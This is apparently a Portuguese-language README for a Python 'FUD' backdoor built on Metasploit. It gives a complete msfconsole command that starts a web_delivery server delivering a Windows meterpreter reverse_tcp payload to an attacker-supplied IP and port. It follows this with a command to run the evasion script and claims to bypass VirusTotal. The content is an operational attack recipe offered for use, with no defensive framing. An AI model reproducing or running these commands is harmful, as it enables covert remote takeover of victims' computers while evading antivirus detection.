# metasploit-fud-backdoor
backdoor em python pelo metasploit 100% fud

### versão
versão do python: 3

### passo 1
sudo msfconsole -q -x "use multi/script/web_delivery; set lhost SEU_IP; set lport PORTA_TCP; set srvport 8080; set uripath index.php; set target 2; set payload windows/meterpreter/reverse_tcp; exploit -j; clear; clear; clear"

### passo 2
python fud.py SEU_IP 8080

### informação
bypassing virus total

### screenshot
![](https://image.prntscr.com/image/FzbeC9FaQ3yfsJeSTgNoEg.png)
